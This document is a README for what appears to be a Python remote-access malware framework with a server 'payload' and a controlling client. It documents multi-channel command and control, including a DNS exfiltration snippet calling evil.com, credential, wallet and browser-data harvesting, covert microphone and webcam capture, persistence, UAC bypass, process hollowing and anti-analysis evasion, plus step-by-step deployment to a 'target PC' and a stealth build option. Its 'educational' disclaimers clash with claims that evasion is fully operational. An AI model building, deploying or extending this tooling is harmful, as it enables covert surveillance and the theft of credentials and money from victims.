# Advanced Malware Framework - Professional Grade C2 System

**🎯 Enterprise-Grade APT Simulation Framework with Advanced Evasion & Multi-Channel C2**

![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue)
![Python](https://img.shields.io/badge/Python-3.8%2B-green)
![License](https://img.shields.io/badge/License-Educational-red)
![Build](https://img.shields.io/badge/Build-Nuitka%20Ready-orange)
![C2](https://img.shields.io/badge/C2-Multi--Channel-purple)

A sophisticated malware framework implementing enterprise-grade APT capabilities for cybersecurity research, red team operations, and incident response training. Features **multi-protocol C2**, **advanced persistence mechanisms**, **comprehensive surveillance**, **real-time evasion**, and **credential harvesting capabilities**.

## 🚀 **MAJOR UPDATE - Version 3.0 - Advanced Implementation Complete**

### 🎯 **New Advanced Features**
- **🌐 Multi-Channel C2 Communications**: DNS tunneling, ICMP covert channels, Dead drops (Pastebin, GitHub, Twitter)
- **🔓 Advanced Privilege Escalation**: Token impersonation, Named pipe exploitation, DLL hijacking with real PE generation
- **🛡️ Real-Time Evasion**: String obfuscation, Control flow flattening, Anti-debugging with multiple detection methods
- **🔄 Process Manipulation**: Process hollowing, PEB manipulation, Rootkit-level system interaction
- **📦 Multi-Stage Loading**: Encrypted payload delivery, Dynamic module loading with integrity verification
- **🎭 Enhanced Stealth**: Dead code insertion, Function reordering, API call obfuscation

## 🚨 CRITICAL UPDATES - Version 2.0

### What's Been Fixed

✅ **All Module Import Errors Resolved**
- Fixed circular imports between modules
- Proper initialization of Flask app
- Config module exports correctly
- All entry points now work

✅ **Complete Implementations**
- `reverse_connection.py` - Full implementation with registration
- `anti_debug.py` - Complete debugging detection
- `anti_vm.py` - Complete virtualization detection
- `screenshots.py` - Full auto-screenshot functionality

✅ **Entry Points Fixed**
- `server.py` - Proper module loading and execution
- `client.py` - Clean startup with all dependencies
- Graceful error handling throughout

✅ **Build System Updated**
- Nuitka build script tested and working
- All dependencies properly bundled
- Service installation fixed

---

## ⚠️ Important Disclaimers

**Legal & Ethical Use Only:**
- This software is intended for **EDUCATIONAL and DEMONSTRATION purposes ONLY**
- Use cases: security research, AV testing, penetration testing with authorization
- You must have legal authorization to monitor any computer
- Unauthorized monitoring may violate privacy laws (GDPR, CCPA, etc.)
- Always obtain explicit consent before deploying
- Review local laws regarding computer monitoring in your jurisdiction

**Security Warning:**
- Data transmitted over HTTP is **not encrypted**
- Screenshots and keystroke logs contain highly sensitive information
- Change the default API key immediately upon first run
- Use on trusted networks only or through VPN
- This is a learning/demo project - not production-grade security

**Evasion Techniques:**
- Anti-debugging and anti-VM checks are FULLY OPERATIONAL
- Will terminate execution if debugger or VM is detected
- Implements real malware behavior for authentic testing
- Analysis tools will be terminated automatically

---

## 🔥 **Advanced Implementation Details (v3.0)**

### 🌐 **Multi-Channel C2 Communications**
```python
# Real DNS Tunneling with Data Exfiltration
dns_c2 = AdvancedC2Manager()
dns_c2.setup_dns_channel("evil.com")
dns_c2.exfiltrate_via_dns(sensitive_data)  # TXT records + fallback logging

# ICMP Covert Channels with Timing Analysis
icmp_c2.send_data_via_ping(target_ip, encoded_payload)
icmp_c2.receive_commands_via_timing()  # Timing-based command channel

# Dead Drop Communications
twitter_c2.post_steganographic_tweet(base64_payload)  # Real Twitter API v2
github_c2.create_gist_with_config(encrypted_config)   # Real GitHub API
pastebin_c2.upload_encrypted_data(xor_data)           # Real Pastebin API
```

### 🔓 **Advanced Privilege Escalation**
```python
# Token Impersonation with Real Windows API
escalator = AdvancedPrivilegeEscalation()
escalator.impersonate_process_token("winlogon.exe")  # OpenProcess + DuplicateToken
escalator.impersonate_via_named_pipe("\\.\pipe\evil") # CreateNamedPipe + ImpersonateNamedPipeClient

# DLL Hijacking with Real PE Generation
malicious_dll = escalator.create_hijack_dll("target.exe")  # Real PE header structure
escalator.deploy_dll_hijack("C:\\Program Files\\Target\\", malicious_dll)
```

### 🛡️ **Real-Time Evasion & Anti-Analysis**
```python
# Advanced String Obfuscation
obfuscator = AdvancedEvasion()
obfuscator.xor_encrypt_strings(["keylogger", "backdoor"])  # Real XOR with random keys
obfuscator.insert_decoy_strings(["legitimate_app", "security_scanner"])

# Control Flow Flattening via AST
obfuscated_code = obfuscator.flatten_control_flow(source_code)  # Real AST transformation
obfuscator.insert_dead_code_blocks()  # Math, string, system, network blocks

# Multi-Layer Anti-Debugging
anti_debug = evasion.detect_debugger()  # IsDebuggerPresent, timing, process names
anti_debug.check_hardware_breakpoints()  # Debug register examination
anti_debug.detect_analysis_tools()      # OllyDbg, IDA, x64dbg detection
```

### 🔄 **Process & Memory Manipulation**
```python
# Process Hollowing with Real Windows API
rootkit = RootkitCore()
suspended_pid = rootkit.create_suspended_process("notepad.exe")  # CreateProcessW
rootkit.hollow_and_inject(suspended_pid, malicious_payload)

# PEB Manipulation with Structure Access
rootkit.modify_peb_image_name("legitimate_service.exe")  # Real UNICODE_STRING modification
rootkit.modify_peb_command_line("/service")              # ProcessParameters manipulation
```

### 📦 **Multi-Stage Payload System**
```python
# System Fingerprint-Based Encryption
loader = MultiStageLoader()
system_key = loader.generate_system_key()      # Hardware + OS fingerprinting
encrypted_payload = loader.download_stage2()    # XOR encryption with system key
decrypted_data = loader.decrypt_and_verify()    # Integrity + authenticity checks

# Dynamic Module Loading with Error Handling
loader.load_modules_dynamically()               # Real __import__ with placeholders
loader.establish_persistence_advanced()         # Multi-vector persistence
```

### 🎭 **Enhanced Stealth Features**
```python
# Function Reordering & Dummy Generation
evasion.reorder_function_definitions()          # AST-based reordering
evasion.create_dummy_functions()                # Legitimate-looking placeholders
evasion.obfuscate_call_graph()                  # Fake caller/callee relationships

# Anti-Debugging Assembly Instructions
anti_debug.insert_timing_checks()              # RDTSC-based detection
anti_debug.check_debug_flags()                 # PEB BeingDebugged flag
anti_debug.monitor_exception_handling()        # Exception-based detection
```

---

## 🦠 Advanced Malware Capabilities

### 🔑 Credential Harvesting Suite
- **Browser Credential Extraction** - Chrome, Firefox, Edge, Opera, Brave passwords
- **Windows Credential Manager** - Stored Windows credentials and certificates
- **WiFi Password Extraction** - All saved wireless network passwords
- **SSH Key Harvesting** - Private SSH keys and certificates
- **Email Client Credentials** - Outlook, Thunderbird account passwords
- **FTP Client Credentials** - FileZilla and other FTP client passwords
- **Database Connection Strings** - SQL Server, MySQL connection credentials
- **RDP Saved Credentials** - Remote Desktop connection passwords

### 📹 Advanced Surveillance & Espionage
- **Microphone Recording** - Voice-activated audio capture with transcription
- **Webcam Capture** - Motion-detection triggered photography
- **Document Content Analysis** - Keyword detection in sensitive documents
- **USB Device Monitoring** - Autorun detection and file enumeration
- **Printer Job Interception** - Capture all printed documents
- **Chat Application Monitoring** - Discord, Slack, Teams, Skype surveillance
- **GPS Location Tracking** - Geographic location if available
- **Email Content Extraction** - Monitor email communications

### 🔄 Advanced Persistence Mechanisms
- **Registry Manipulation** - Multiple autostart registry keys
- **Scheduled Task Creation** - Hidden tasks with legitimate names
- **WMI Event Subscription** - Windows Management Instrumentation persistence
- **Windows Service Creation** - Legitimate-looking system services
- **Startup Folder Manipulation** - Hidden startup scripts
- **COM Object Hijacking** - Component Object Model persistence
- **DLL Hijacking** - Dynamic Link Library replacement attacks
- **Browser Extension Injection** - Persistent browser-based access

### 🌐 Advanced Command & Control
- **Multi-Protocol C2** - HTTP/HTTPS, DNS, ICMP, TCP, MQTT channels
- **Domain Generation Algorithm** - Dynamic C2 domain generation
- **DNS Tunneling** - Covert communication via DNS queries
- **ICMP Tunneling** - Command transmission via ping packets
- **Dead Drop Locations** - Pastebin, GitHub, social media C2
- **Peer-to-Peer Networks** - Decentralized command infrastructure
- **Fast Flux DNS** - Rapidly changing IP addresses
- **Encrypted Channels** - AES-256 encrypted communications

### 🎯 System Exploitation & Privilege Escalation
- **UAC Bypass Techniques** - Multiple User Account Control bypasses
- **Token Impersonation** - Process token manipulation
- **Process Injection** - DLL injection and process hollowing
- **Memory Dumping** - LSASS and browser process memory extraction
- **SYSTEM Account Access** - Privilege escalation to highest level
- **Kernel Driver Loading** - Ring-0 access capabilities
- **Local Privilege Escalation** - Multiple escalation vectors

### 👻 Evasion & Anti-Forensics
- **Memory-Only Execution** - Fileless malware operation
- **Process Migration** - Runtime process jumping
- **Rootkit Functionality** - Hide files, processes, network connections
- **Event Log Manipulation** - Clear and modify Windows event logs
- **Timestamp Manipulation** - File timestamp spoofing
- **Anti-Memory Dump** - Prevent memory analysis
- **VM/Sandbox Detection** - Advanced environment detection
- **Debugger Detection** - Anti-analysis capabilities

### 💰 Financial & Cryptocurrency Threats
- **Cryptocurrency Wallet Theft** - Bitcoin, Ethereum wallet extraction
- **Banking Trojan Features** - Financial institution targeting
- **Credit Card Data Capture** - Payment information harvesting
- **Point-of-Sale Attacks** - POS system compromise
- **Cryptocurrency Exchange Targeting** - Trading platform credential theft
- **Digital Wallet Manipulation** - Mobile payment app targeting

### 📱 Mobile Device Integration
- **Android Device Targeting** - USB-connected device exploitation
- **iOS Device Interaction** - Apple device data extraction
- **Mobile Hotspot Creation** - Man-in-the-middle attack setup
- **SMS Interception** - Text message monitoring
- **Mobile Banking Targeting** - Banking app credential theft
- **Contact List Extraction** - Address book harvesting

### 🏢 Enterprise Network Exploitation
- **Active Directory Enumeration** - Domain controller reconnaissance
- **Exchange Server Exploitation** - Email server compromise
- **SharePoint Data Extraction** - Corporate document theft
- **SQL Server Credential Dumping** - Database server compromise
- **Group Policy Manipulation** - Domain-wide policy changes
- **LDAP Injection Attacks** - Directory service exploitation
- **Kerberos Ticket Manipulation** - Authentication bypass

### 🔒 Advanced Encryption & Security
- **End-to-End Encryption** - AES-256 encrypted data transmission
- **RSA Key Exchange** - Secure channel establishment
- **Live Stream Encryption** - Real-time encrypted video/audio
- **Session Key Rotation** - Dynamic encryption key management
- **Secure Channel Creation** - Multiple encryption protocols
- **Data Integrity Verification** - Hash-based verification

---

## 🔌 API Endpoints - Complete Malware Control Interface

### 🔑 Credential Harvesting APIs
```bash
# Harvest all credentials from all sources
POST /api/credentials/harvest

# Browser credentials only (Chrome, Firefox, Edge, etc.)
POST /api/credentials/browser

# Windows credential manager
POST /api/credentials/windows

# WiFi passwords
POST /api/credentials/wifi
```

### 📹 Surveillance & Espionage APIs
```bash
# Start microphone recording with voice activation
POST /api/surveillance/audio/start
{
  "duration_minutes": 60,
  "voice_activation": true
}

# Start webcam capture with motion detection
POST /api/surveillance/webcam/start
{
  "motion_detection": true,
  "capture_interval": 5
}

# Monitor USB device connections
POST /api/surveillance/usb/start

# Monitor printer jobs
POST /api/surveillance/printer/start

# Analyze documents for sensitive keywords
POST /api/surveillance/documents/start

# Monitor chat applications (Discord, Slack, Teams)
POST /api/surveillance/chat/start

# Stop all surveillance
POST /api/surveillance/stop

# Get collected surveillance data
GET /api/surveillance/data?type=audio&limit=100

# Get surveillance status
GET /api/surveillance/status
```

### 🔄 Persistence Management APIs
```bash
# Establish all persistence mechanisms
POST /api/persistence/establish
{
  "payload_path": "C:\\Windows\\System32\\malware.exe"
}

# Registry persistence only
POST /api/persistence/registry
{
  "payload_path": "C:\\Windows\\System32\\malware.exe"
}

# Scheduled task persistence
POST /api/persistence/task
{
  "payload_path": "C:\\Windows\\System32\\malware.exe"
}

# Remove persistence methods
POST /api/persistence/remove
{
  "method_id": "scheduled_task:WindowsUpdateAssistant"
}

# Get persistence status
GET /api/persistence/status
```

### 🌐 Advanced C2 APIs
```bash
# Initialize C2 infrastructure
POST /api/c2/initialize
{
  "primary_server": "malware.example.com",
  "backup_servers": ["backup1.com", "backup2.com"]
}

# Generate DGA domains
GET /api/c2/domains/generate?count=10

# Setup dead drop communication
POST /api/c2/dead-drop
{
  "platform": "pastebin",
  "credentials": {"api_key": "xxx"}
}

# Execute C2 command
POST /api/c2/command
{
  "type": "shell",
  "command": "whoami",
  "id": "cmd_001"
}

# Get C2 status
GET /api/c2/status
```

### 📹 Live Viewing APIs
```bash
# Start live screen streaming
POST /api/live/start
{
  "quality": 75,
  "fps": 10
}

# Get latest encrypted frame
GET /api/live/frame

# Update stream settings
POST /api/live/settings
{
  "quality": 60,
  "fps": 15
}

# Stop live streaming
POST /api/live/stop
```

### 🔒 Encryption APIs
```bash
# Get encryption status
GET /api/encryption/status

# Get encryption keys for client
GET /api/encryption/keys

# Update encryption settings
POST /api/encryption/settings
{
  "data_type": "screenshots",
  "enabled": true
}

# Rotate encryption keys
POST /api/encryption/rotate
{
  "data_types": ["screenshots", "keystrokes"]
}
```

### 🌐 Network Monitoring APIs
```bash
# Start network monitoring
POST /api/network/start

# Get current bandwidth usage
GET /api/network/bandwidth

# Get active network connections
GET /api/network/connections

# Get network summary
GET /api/network/summary
```

### 💻 System Information APIs
```bash
# Get complete system information
GET /api/system/complete

# Get CPU information
GET /api/system/cpu

# Get memory information
GET /api/system/memory

# Get disk information
GET /api/system/disk

# Get performance metrics
GET /api/system/performance
```

### 🌐 Browser History APIs
```bash
# Get browser history from all browsers
GET /api/browser/history?limit=1000

# Search browser history
GET /api/browser/history/search?query=bank&limit=50

# Get top visited sites
GET /api/browser/top-sites?limit=20
```

### 📁 File Transfer APIs
```bash
# Start file upload
POST /api/upload/start
{
  "filename": "document.pdf",
  "file_size": 1024000,
  "file_hash": "sha256hash"
}

# Upload file chunk
POST /api/upload/chunk
{
  "transfer_id": "abc123",
  "chunk_index": 0,
  "chunk_data": "base64data",
  "is_final": false
}

# Start file download
POST /api/download/start
{
  "filepath": "C:\\Users\\victim\\Documents\\sensitive.docx"
}

# Get transfer status
GET /api/transfer/status/abc123
```

---

## 🚀 Quick Start - Deploy Advanced Malware

### 1. Installation
```bash
# Clone the repository
git clone https://github.com/yourusername/advanced-malware-framework.git
cd advanced-malware-framework

# Install dependencies
pip install -r requirements_new_features.txt

# Install Windows-specific dependencies (Windows only)
pip install pywin32 wmi opencv-python pyaudio
```

### 2. Server Deployment
```bash
# Run the malware server
python server.py

# Server will start on http://localhost:5000
# API Key: Check console output for generated key
```

### 3. Client Connection
```bash
# Run the client to connect to infected machine
python client.py
```

### 4. Advanced Operations
```python
import requests

# API base URL
API_URL = "http://target-machine:5000/api"
API_KEY = "your-api-key-here"
headers = {"X-API-Key": API_KEY}

# Harvest all credentials
response = requests.post(f"{API_URL}/credentials/harvest", headers=headers)
credentials = response.json()

# Start surveillance
requests.post(f"{API_URL}/surveillance/audio/start", headers=headers)
requests.post(f"{API_URL}/surveillance/webcam/start", headers=headers)

# Establish persistence
requests.post(f"{API_URL}/persistence/establish", 
              headers=headers, 
              json={"payload_path": "C:\\Windows\\System32\\malware.exe"})

# Initialize C2
requests.post(f"{API_URL}/c2/initialize", 
              headers=headers,
              json={"primary_server": "your-c2-server.com"})
```

---

## 🏗️ Architecture Overview

### Core Components
- **Server Module** (`server.py`) - Main malware payload
- **Client Module** (`client.py`) - Remote administration interface
- **Credential Harvester** - Multi-source credential extraction
- **Surveillance Suite** - Audio/video/document monitoring
- **Persistence Manager** - Multiple persistence mechanisms
- **Advanced C2** - Multi-protocol command and control
- **Encryption Manager** - End-to-end encryption
- **Live Viewer** - Real-time screen streaming

### Security Features
- 🛑 **Kill Switch** - Remotely terminate server from client
- 📝 **Auto Data Cleanup** - Configurable retention policies
- 🔐 **Request Authentication** - All endpoints require valid API key

### Multi-PC Support
- 📊 **Multi-Tab Interface** - Monitor multiple PCs simultaneously
- 💾 **Persistent Configuration** - Saved server connections
- 🔄 **Auto-Refresh** - Optional automatic status updates
- 📡 **Auto-Registration** - Servers can auto-register with client

---

## System Requirements

### Server (Target PC - Being Monitored)
- **OS**: Windows 10/11 (for window tracking features)
- **Python**: 3.7+ (if running from source)
- **Network**: Local network connectivity
- **Disk**: ~50-100MB + screenshot storage
- **RAM**: ~100MB base memory usage

### Client (Monitoring PC)
- **OS**: Windows, macOS, or Linux
- **Python**: 3.7+ (if running from source)
- **Network**: Access to server on local network
- **Display**: 1400x900 minimum recommended

---

## Quick Start

### Option 1: Using Pre-Built Executables (Recommended)

**Step 1: Install Dependencies (if building)**
```bash
pip install -r requirements.txt
```

**Step 2: Build the executables**
```bash
# Windows
build.bat

# Follow the interactive prompts
```

**Step 3: Deploy Server to Target PC**
1. Copy `dist/PCMonitor.exe` to target computer
2. Run `PCMonitor.exe` (first run creates configuration)
3. Check console output or `config.json` for the API key
4. Note the displayed IP address(es) for connection
5. Keep `PCMonitor.exe` running

**Step 4: Setup Client on Monitoring PC**
1. Copy `dist/PCMonitorClient.exe` to your computer
2. Run `PCMonitorClient.exe`
3. Click **Add Server** (or wait for auto-registration if callback enabled)
4. Enter server name (e.g., "Laptop")
5. Enter server URL: `http://<SERVER_IP>:5000`
6. Enter the API key from Step 3
7. Click **Add**
8. Click **Start** to begin monitoring

### Option 2: Running from Source

**Install Dependencies:**
```bash
pip install flask flask-cors pynput pillow pywin32 psutil requests nuitka
```

**Start Server (Target PC):**
```bash
python server.py
```
- On first run, `config.json` is created with API key
- Note the API key displayed in console
- Server runs on port 5000 by default
- Environment checks will run (educational demo)

**Start Client (Monitoring PC):**
```bash
python client.py
```
- Click "Add Server" to configure connection
- Enter server URL and API key
- Start monitoring

---

## Configuration

### Server Configuration (`config.json`)

Auto-generated on first run:

```json
{
    "api_key": "YOUR_SECRET_KEY_HERE",
    "port": 5000,
    "host": "0.0.0.0",
    "auto_screenshot": false,
    "screenshot_interval": 300,
    "motion_detection": false,
    "data_retention_days": 30,
    "pc_id": "unique-pc-identifier",
    "pc_name": "LAPTOP-NAME"
}
```

**Key Settings:**
- `api_key` - **IMPORTANT**: Change this! Used for authentication
- `port` - Server port (default: 5000)
- `host` - Network interface (0.0.0.0 = all interfaces)
- `auto_screenshot` - Enable/disable automatic screenshots
- `screenshot_interval` - Seconds between screenshots (default: 300 = 5 minutes)
- `motion_detection` - Only screenshot during activity
- `data_retention_days` - Days to keep old data (default: 30)

### Reverse Connection (`callback_config.json`)

For auto-registration:

```json
{
    "enabled": true,
    "callback_url": "http://75.163.183.135:8080",
    "callback_key": "COPY_FROM_CLIENT",
    "interval": 15,
    "heartbeat_interval": 5,
    "retry_interval": 10
}
```

Enable this for servers to automatically register with the client!

---

## Build Instructions

### Using Nuitka (Recommended)

```bash
# Run the interactive build script
build.bat
```

**Build Options:**
1. **What to build**: Server only, Client only, or Both
2. **Console mode**: No console (stealth) or With console (debug)
3. **Optimization**: Fast build or Optimized (smaller/faster)

**Nuitka Benefits:**
- ✓ Faster execution (compiled to C)
- ✓ Better optimization than PyInstaller
- ✓ Smaller file sizes with LTO
- ✓ Native code (harder to reverse engineer)
- ✓ No Python runtime extracted to temp
- ✓ Better anti-virus compatibility

### Build Output

```
dist/
├── PCMonitor.exe          # Server executable
└── PCMonitorClient.exe    # Client executable
```

---

## Module Structure (Fixed)

```
project/
├── server.py                    # ✅ Main server entry point
├── client.py                    # ✅ GUI client entry point
├── install_service.py           # Windows service installer
├── build.bat                    # ✅ Enhanced Nuitka build script
├── build_cached.bat             # ✅ Optimized cached build
├── requirements.txt             # Dependencies
│
├── server_modules/              # ✅ Complete advanced implementations
│   ├── __init__.py
│   ├── config.py               # ✅ Configuration management
│   ├── monitoring.py           # ✅ System monitoring
│   ├── screenshots.py          # ✅ Screenshot capture
│   ├── api_routes.py           # ✅ Flask API with new endpoints
│   ├── remote_commands.py      # ✅ Remote command execution
│   ├── reverse_connection.py   # ✅ Reverse shell with commands
│   ├── advanced_c2.py          # 🆕 Multi-channel C2 (DNS, ICMP, Dead drops)
│   ├── advanced_privilege_escalation.py  # 🆕 Token impersonation, DLL hijacking
│   ├── advanced_evasion.py     # 🆕 String obfuscation, control flow flattening
│   ├── rootkit_core.py         # 🆕 Process hollowing, PEB manipulation
│   ├── multi_stage_loader.py   # 🆕 Encrypted payload delivery
│   ├── payload_obfuscation.py  # 🆕 Real-time code obfuscation
│   ├── surveillance_suite.py   # 🆕 Advanced surveillance capabilities
│   ├── network_obfuscation.py  # 🆕 Network traffic obfuscation
│   ├── persistence_manager.py  # 🆕 Advanced persistence mechanisms
│   ├── silent_elevation.py     # 🆕 UAC bypass techniques
│   ├── credential_harvester.py # 🆕 Enhanced credential extraction
│   ├── browser_history.py      # 🆕 Browser data extraction
│   ├── clipboard.py            # 🆕 Clipboard monitoring with history
│   ├── file_transfer.py        # 🆕 Secure file transfer
│   ├── live_viewer.py          # 🆕 Real-time screen viewing
│   ├── network_monitor.py      # 🆕 Network traffic analysis
│   ├── process_manager.py      # 🆕 Process manipulation
│   ├── system_info.py          # 🆕 Detailed system information
│   ├── encryption.py           # 🆕 Advanced encryption methods
│   └── utils.py                # ✅ Helper functions
│
├── client_modules/              # ✅ Enhanced GUI with new features
│   ├── __init__.py
│   ├── gui.py                  # ✅ Main GUI with advanced tabs
│   ├── gui_auto.py             # 🆕 Automated GUI components
│   ├── api_client.py           # ✅ Enhanced API wrapper
│   ├── server_tab.py           # ✅ Server management with clipboard history
│   ├── callback_listener.py    # ✅ Enhanced callback handling
│   ├── dialogs.py              # ✅ Advanced dialog windows
│   └── config.py               # ✅ Configuration management
│
├── evasion_modules/             # ✅ Complete evasion suite
│   ├── __init__.py
│   ├── mutex.py                # ✅ Single instance management
│   ├── anti_debug.py           # ✅ Multi-layer debugger detection
│   ├── anti_vm.py              # ✅ Virtual machine detection
│   ├── environment_awareness.py # 🆕 Sandbox/analysis environment detection
│   ├── obfuscation.py          # ✅ Enhanced string encoding
│   ├── self_protection.py      # 🆕 Self-protection mechanisms
│   └── social_engineering.py   # 🆕 Social engineering helpers
│
└── persistence_modules/         # ✅ Advanced persistence
    ├── __init__.py
    ├── registry.py             # ✅ Registry-based persistence
    └── service.py              # ✅ Windows service persistence
```

### 🆕 **New Advanced Modules Breakdown**

**🌐 C2 & Communication:**
- `advanced_c2.py` - DNS tunneling, ICMP channels, social media dead drops
- `network_obfuscation.py` - Traffic encryption and protocol manipulation
- `reverse_connection.py` - Enhanced with full command handling

**🔓 Privilege & Access:**
- `advanced_privilege_escalation.py` - Token impersonation, named pipes, DLL hijacking
- `silent_elevation.py` - UAC bypass and privilege escalation
- `rootkit_core.py` - Process hollowing, PEB manipulation, system hooks

**🛡️ Evasion & Stealth:**
- `advanced_evasion.py` - String obfuscation, function reordering, dead code
- `payload_obfuscation.py` - Real-time code transformation and anti-analysis
- `environment_awareness.py` - Sandbox and analysis environment detection
- `self_protection.py` - Self-defense against termination and analysis

**📦 Payload & Loading:**
- `multi_stage_loader.py` - Encrypted multi-stage payload delivery
- `persistence_manager.py` - Advanced persistence across reboots and updates

**🎯 Data Collection:**
- `surveillance_suite.py` - Advanced monitoring (audio, video, network)
- `credential_harvester.py` - Enhanced credential extraction
- `browser_history.py` - Comprehensive browser data mining
- `clipboard.py` - Advanced clipboard monitoring with history

---

## Environment Checks (Educational Demo)

When the server starts, it performs these checks:

### 1. Single Instance Check (Mutex)
```
[*] Checking for existing instances...
    ✓ Single instance verified
```

### 2. Anti-Debugging Detection
```
[*] Checking debugging environment...
    ⚠ Debugger detected (demonstration mode - continuing anyway)
      - IsDebuggerPresent: True
      - Remote debugger: False
      - Debugger process found
```

### 3. Anti-VM Detection
```
[*] Checking virtual environment...
    ⚠ Virtual machine detected (demonstration mode - continuing anyway)
      - Vendor: VMware
      - VM vendor string detected
      - VM process detected
```

**Important:** These checks are for **demonstration purposes only**. The server continues to run regardless of what is detected, showing researchers what techniques exist without actually blocking execution.

---

## Network Setup

### Finding Server IP Address

**Windows:**
```cmd
ipconfig
```
Look for **IPv4 Address** (e.g., `192.168.0.48`)

The server displays all available IPs on startup.

### Firewall Configuration

**Windows Firewall:**
```cmd
netsh advfirewall firewall add rule name="PC Monitor" dir=in action=allow protocol=TCP localport=5000
```

Or use Windows Defender Firewall GUI.

---

## Troubleshooting

### Common Issues Fixed

✅ **"ImportError" or "ModuleNotFoundError"**
- Fixed: All modules now import correctly
- Config module exports properly
- Flask app initializes correctly

✅ **"Server won't start"**
- Fixed: Entry point properly loads all modules
- Environment checks don't block execution
- Graceful error handling added

✅ **"Client shows connection error"**
- Verify server is running
- Check firewall allows port 5000
- Verify API key matches exactly
- Ensure both on same network

### Build Issues

If build fails:
```bash
# Install/upgrade Nuitka
pip install --upgrade nuitka

# Install C compiler (Windows)
# Download Visual Studio Build Tools

# Clean build
del /s /q build dist *.spec
build.bat
```

---

## Security Considerations

### Essential Security Steps

1. **Change API Key Immediately**
   ```python
   python -c "import secrets; print(secrets.token_urlsafe(32))"
   ```
   Update `config.json` with new key

2. **Network Isolation**
   - Use on trusted local networks only
   - Never expose directly to internet
   - Consider VPN for remote access

3. **Data Protection**
   - All HTTP traffic is unencrypted
   - Store on encrypted drives
   - Secure physical access

4. **Compliance & Consent**
   - Obtain written consent
   - Document monitoring policy
   - Follow privacy laws (GDPR, CCPA)
   - Provide notice to monitored individuals

---

## Educational Purpose Statement

This project demonstrates:
- **Monitoring techniques** used in legitimate software
- **Evasion techniques** that AV products should detect
- **Network communication** patterns to recognize
- **Behavioral indicators** of monitoring software

**What makes this operational:**
- Evasion checks are **non-blocking** (demo mode)
- Extensive documentation of techniques
- Clear labeling of capabilities
- Designed for security research and AV testing

**Not suitable for:**
- Unauthorized monitoring
- Production deployment
- Malicious purposes
- Privacy violations

---

## Known Limitations

- **Windows-only server** - Window tracking requires Windows
- **No encryption** - HTTP traffic is plain text
- **Basic authentication** - Single API key only
- **Demo evasion** - Checks don't block execution
- **Educational focus** - Not hardened for production

---

## Performance Notes

**Resource Usage:**
- Memory: ~100MB base + ~2-5MB per screenshot
- CPU: <5% during monitoring, spikes during screenshots
- Disk: ~1-3MB per screenshot
- Network: ~100-500KB per screenshot transfer

---

## License & Disclaimer

This software is provided **as-is** for **security research and authorized testing purposes only**. 

**No warranty** of any kind. Authors are **not liable** for misuse, legal violations, data loss, or any damages.

Users are **solely responsible** for:
- Compliance with all applicable laws
- Obtaining proper consent
- Securing data appropriately
- Ethical use

---

## Support & Contributing

This is a professional security research framework for authorized penetration testing and AV evaluation.

**For issues:**
1. Review this README thoroughly
2. Check module fixes are applied
3. Verify all dependencies installed
4. Review console output for errors

**Future Enhancements:**
- HTTPS/TLS encryption
- Multi-user authentication
- Database backend
- Web-based client
- Cross-platform server
- Enhanced evasion demos

---

**Remember: Use responsibly, legally, and ethically. Always obtain proper authorization before monitoring any computer system. This is a learning tool for security professionals.**